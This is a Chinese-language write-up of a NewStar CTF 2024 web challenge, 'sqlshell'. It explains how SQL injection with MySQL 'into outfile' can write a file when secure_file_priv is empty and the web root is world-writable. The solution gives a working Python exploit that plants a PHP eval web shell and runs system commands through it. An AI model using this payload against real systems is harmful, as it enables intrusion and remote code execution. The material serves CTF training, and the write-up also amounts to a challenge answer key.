# sqlshell

> 分类：Web

## 题目描述
SQL 注入写文件 getshell 题。mysql 启动时加了 `--secure_file_priv=''`，允许任意目录文件读写；且执行了 `chmod 777 /var/www/html`，允许写入网站根目录。通过 `into outfile` 写一个木马到 `/var/www/html` 下。

## 考察知识点
- SQL 注入（union select）
- MySQL `into outfile` 写文件
- `--secure_file_priv=''` 与目录权限配合

## 解法
`--secure_file_priv=''` 表示能对任意目录文件读写，结合 `chmod 777 /var/www/html`，直接通过 `into outfile` 写木马到网站根目录。

EXP：

```python
import requests

url = 'http://192.168.109.128:8889'

payload = '\' || 1 union select 1,2,"<?php eval($_GET[1]);" into outfile \'/var/www/html/3.php\'#'

res = requests.get(url,params={'student_name': payload})
res = requests.get(f'{url}/3.php', params={'1': 'system("cat /you_cannot_read_the_flag_directly");'})
print(res.text)
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week5/web/sqlshell.html
